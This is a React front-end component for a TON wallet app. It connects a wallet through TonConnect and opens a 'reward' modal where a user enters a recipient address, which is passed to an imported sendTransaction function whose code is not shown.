

import { useState } from 'react';
import './App.css';
import { TonConnectButton } from '@tonconnect/ui-react';
import { sendTransaction } from './transaction'; // Импортируйте вашу функцию

function App() {
    const [recipientAddress, setRecipientAddress] = useState('');
    const [loading, setLoading] = useState(false);
    const [message, setMessage] = useState('');
    const [isModalOpen, setModalOpen] = useState(false);

    const handleSendTokens = async () => {
        if (!recipientAddress) {
            alert("Введите адрес кошелька");
            return;
        }

        setLoading(true);
        setMessage('');

        try {
            await sendTransaction(recipientAddress);
            setMessage('Токены успешно отправлены!');

            // Устанавливаем таймер на 10 секунд
            setTimeout(() => {
                setMessage('Токены будут отправлены в течение 10 минут.');
            }, 10000);
        } catch (error) {
            console.error(error);
            setMessage('Произошла ошибка при отправке токенов.');
        } finally {
            setLoading(false);
            setModalOpen(false); // Закрыть модальное окно после отправки
        }
    };

    return (
        <>
            <TonConnectButton />
            <button onClick={() => setModalOpen(true)}>Награда</button>

            {/* Модальное окно */}
            {isModalOpen && (
                <div className="modal">
                    <h2>Введите адрес кошелька</h2>
                    <input 
                        type="text" 
                        value={recipientAddress} 
                        onChange={(e) => setRecipientAddress(e.target.value)} 
                        placeholder="Адрес получателя" 
                    />
                    <button onClick={handleSendTokens} disabled={loading}>
                        {loading ? 'Отправка...' : 'Получить'}
                    </button>
                    {message && <p>{message}</p>}
                    <button onClick={() => setModalOpen(false)}>Закрыть</button>
                </div>
            )}
        </>
    );
}

export default App;
